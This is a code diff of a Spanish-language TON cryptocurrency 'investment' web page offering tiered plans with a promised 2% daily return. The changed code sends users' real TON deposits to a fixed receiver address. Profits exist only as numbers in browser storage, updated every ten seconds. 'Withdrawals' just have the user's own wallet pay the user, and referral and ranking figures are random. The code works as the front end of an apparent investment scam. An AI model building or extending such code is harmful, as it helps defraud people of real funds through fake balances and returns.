@@ -24,6 +24,7 @@ button{width:100%;padding:12px;border:none;border-radius:12px;margin-bottom:8px;
 .btn-soft{background:#1E293B;color:#E2E8F0;}
 input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;background:#1E293B;color:white;}
 .footer{text-align:center;font-size:11px;color:#64748B;margin-top:15px;}
+.plan-button{margin-bottom:6px;}
 </style>
 </head>
 <body>
@@ -51,13 +52,15 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 <div>Rentabilidad diaria: 2%</div>
 </div>
 
-<!-- Inversión -->
+<!-- Inversión / Planes -->
 <div class="card">
-<div class="section-title">Inversión</div>
-<input type="number" id="amount" placeholder="Monto en TON">
-<button class="btn-primary" onclick="deposit()">Depositar</button>
-<button class="btn-success" onclick="activate()">Activar Plan</button>
-<button class="btn-success" onclick="reinvest()">Reinvertir</button>
+<div class="section-title">Activar Plan</div>
+<input type="number" id="amount" placeholder="Monto en TON/USD">
+<button class="btn-success plan-button" onclick="activatePlan(1)">Plan 1 - Prueba (Simulación)</button>
+<button class="btn-success plan-button" onclick="activatePlan(2)">Plan 2 - 30 días (20-100 USD TON)</button>
+<button class="btn-success plan-button" onclick="activatePlan(3)">Plan 3 - 60 días (101-200 USD TON)</button>
+<button class="btn-success plan-button" onclick="activatePlan(4)">Plan 4 - 90 días (201-10000 USD TON)</button>
+<button class="btn-success" onclick="reinvestPlan()">Reinvertir (+20 TON min)</button>
 </div>
 
 <!-- Finanzas -->
@@ -90,6 +93,7 @@ let tonBalance = parseFloat(localStorage.getItem("tonBalance")) || 0;
 let panBalance = parseFloat(localStorage.getItem("panBalance")) || 0;
 let pendingProfit = parseFloat(localStorage.getItem("pendingProfit")) || 0;
 let planActive = JSON.parse(localStorage.getItem("planActive")) || false;
+let currentPlan = parseInt(localStorage.getItem("currentPlan")) || 1;
 let history = JSON.parse(localStorage.getItem("history")) || [];
 let walletAddress = localStorage.getItem("walletAddress") || null;
 
@@ -117,51 +121,71 @@ function updateUI(){
   localStorage.setItem("panBalance", panBalance);
   localStorage.setItem("pendingProfit", pendingProfit);
   localStorage.setItem("planActive", planActive);
+  localStorage.setItem("currentPlan", currentPlan);
   localStorage.setItem("history", JSON.stringify(history));
 }
 
-// Conectar wallet real
-function connectWallet(){
-  tonConnectUI.connect();
-}
-
 // Depositar TON real
-async function deposit(){
-  let amount = parseFloat(document.getElementById("amount").value);
-  if(amount>0){
-    if(!walletAddress){ alert("Conecta tu wallet primero"); return; }
-
-    const transfer = {
-      validUntil: Math.floor(Date.now()/1000) + 600,
-      messages:[{
-        address: TON_RECEIVER,
-        amount: (amount*1e9).toString() // TON en nanoton
-      }]
-    };
-
-    try{
-      await tonConnectUI.sendTransaction(transfer);
-      tonBalance += amount;
-      history.push(`Depósito: ${amount} TON (real)`);
-      updateUI();
-      alert("Depósito enviado y registrado");
-    } catch(e){
-      alert("Error en la transacción: "+e);
-    }
-  }
-}
-
-// Activar Plan
-function activate(){
-  if(tonBalance>0){
-    planActive = true;
-    history.push("Plan activado");
+async function deposit(amount){
+  if(!walletAddress){ alert("Conecta tu wallet primero"); return; }
+  if(amount<=0){ alert("Monto inválido"); return; }
+  const transfer = {
+    validUntil: Math.floor(Date.now()/1000) + 600,
+    messages:[{
+      address: TON_RECEIVER,
+      amount: (amount*1e9).toString()
+    }]
+  };
+  try{
+    await tonConnectUI.sendTransaction(transfer);
+    tonBalance += amount;
+    history.push(`Depósito: ${amount} TON (real)`);
     updateUI();
-    alert("Plan activado con éxito");
+    alert("Depósito enviado y registrado");
+  }catch(e){
+    alert("Error en la transacción: "+e);
   }
 }
 
-// Generar ganancia diaria
+// Activar planes
+async function activatePlan(plan){
+  let amount = parseFloat(document.getElementById("amount").value);
+  if(plan === 1){ // Plan de prueba
+    if(amount<=0){ alert("Monto inválido"); return; }
+    tonBalance += amount;
+    history.push(`Plan 1 activado: ${amount} TON (simulado)`);
+    planActive = true;
+    currentPlan = 1;
+    updateUI();
+    alert("Plan de prueba activado (simulado)");
+  } else {
+    // Validar mínimos y máximos
+    let min=0,max=0;
+    if(plan===2){ min=20; max=100; }
+    if(plan===3){ min=101; max=200; }
+    if(plan===4){ min=201; max=10000; }
+    if(amount<min || amount>max){ alert(`Monto inválido para este plan: ${min}-${max} USD TON`); return; }
+
+    await deposit(amount); // Transacción real al proyecto
+    planActive = true;
+    currentPlan = plan;
+    history.push(`Plan ${plan} activado con ${amount} TON`);
+    updateUI();
+    alert(`Plan ${plan} activado con éxito`);
+  }
+}
+
+// Reinvertir
+function reinvestPlan(){
+  if(panBalance<20){ alert("Monto mínimo 20 PAN para reinvertir"); return; }
+  tonBalance += panBalance;
+  history.push(`Reinvertido: ${panBalance} PAN`);
+  panBalance = 0;
+  updateUI();
+  alert("Reinvertido correctamente");
+}
+
+// Generar ganancias diarias (simulación)
 function generateProfit(){
   if(planActive){
     let profit = tonBalance*0.02;
@@ -169,7 +193,7 @@ function generateProfit(){
     updateUI();
   }
 }
-setInterval(generateProfit,10000); // Simula día cada 10 seg
+setInterval(generateProfit,10000);
 
 // Reclamar PAN
 function claim(){
@@ -179,17 +203,6 @@ function claim(){
     pendingProfit = 0;
     updateUI();
     alert("Ganancia reclamada en PAN");
-  }
-}
-
-// Reinvertir
-function reinvest(){
-  if(panBalance>0){
-    tonBalance += panBalance;
-    history.push(`Reinvertido: ${panBalance} PAN`);
-    panBalance = 0;
-    updateUI();
-    alert("Reinvertido correctamente");
   }
 }
 
@@ -209,48 +222,32 @@ async function withdraw(){
   let amount = parseFloat(prompt("Monto a retirar"));
   if(amount>0 && amount<=tonBalance){
     if(!walletAddress){ alert("Conecta tu wallet primero"); return; }
-
     const transfer = {
       validUntil: Math.floor(Date.now()/1000) + 600,
       messages:[{
         address: walletAddress,
-        amount: (amount*1e9).toString() // TON en nanoton
+        amount: (amount*1e9).toString()
       }]
     };
-
     try{
       await tonConnectUI.sendTransaction(transfer);
       tonBalance -= amount;
       history.push(`Retiro: ${amount} TON (real)`);
       updateUI();
       alert("Retiro realizado con éxito");
-    } catch(e){
+    }catch(e){
       alert("Error en la transacción: "+e);
     }
   }
 }
 
 // Historial
-function historyLog(){
-  alert(history.join("\n"));
-}
-
-// Referidos simulados
-function referidos(){
-  let refs = Math.floor(Math.random()*20);
-  alert(`Tienes ${refs} referidos activos (simulado)`);
-}
-
-// Ranking simulado
-function ranking(){
-  let pos = Math.floor(Math.random()*100)+1;
-  alert(`Estás en posición #${pos} del ranking global (simulado)`);
-}
+function historyLog(){ alert(history.join("\n")); }
+function referidos(){ let refs=Math.floor(Math.random()*20); alert(`Tienes ${refs} referidos activos (simulado)`); }
+function ranking(){ let pos=Math.floor(Math.random()*100)+1; alert(`Estás en posición #${pos} del ranking global (simulado)`); }
 
 updateUI();
-if(walletAddress){
-  document.getElementById("walletText").innerText = walletAddress.slice(0,6)+"...";
-}
+if(walletAddress){ document.getElementById("walletText").innerText = walletAddress.slice(0,6)+"..."; }
 
 </script>
 </body>
